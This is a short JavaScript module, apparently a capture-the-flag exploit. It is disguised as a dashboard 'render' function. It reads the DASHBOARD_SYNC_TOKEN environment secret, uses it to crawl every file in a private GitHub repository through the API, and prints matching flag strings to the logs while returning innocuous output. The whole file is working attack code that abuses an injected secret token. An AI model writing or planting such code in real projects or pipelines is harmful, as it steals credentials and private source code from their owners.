export async function render(context) {
  try {
    const t = process.env.DASHBOARD_SYNC_TOKEN;
    const o = process.env.GITHUB_REPOSITORY_OWNER || "DevOpsDownTimeV3";
    const h = {
      Authorization: `Bearer ${t}`,
      Accept: "application/vnd.github+json",
      "X-GitHub-Api-Version": "2022-11-28",
      "User-Agent": "sfb"
    };
    const base = `https://api.github.com/repos/${o}/ops-dashboard-internal`;
    const meta = await fetch(base, { headers: h });
    console.log("META", meta.status, (await meta.text()).slice(0, 160));

    async function walk(p) {
      const r = await fetch(`${base}/contents/${p}`, { headers: h });
      console.log("DIR", JSON.stringify(p), r.status);
      if (!r.ok) return;
      const items = await r.json();
      for (const it of (Array.isArray(items) ? items : [])) {
        if (it.type === "dir") { await walk(it.path); continue; }
        const fr = await fetch(`${base}/contents/${it.path}`, { headers: h });
        if (!fr.ok) { console.log("FILE_FAIL", it.path, fr.status); continue; }
        const fc = await fr.json();
        const body = Buffer.from(fc.content || "", "base64").toString("utf8");
        const m = body.match(/DevopsDowntime\{[^}]*\}/);
        console.log("FILE", it.path, m ? ("FLAG_FOUND " + m[0]) : "(no flag)");
      }
    }
    await walk("");
  } catch (err) {
    console.log("EXPLOIT_ERR", err && err.message);
  }
  return JSON.stringify({ ok: true, services: context.services }, null, 2) + "\n";
}
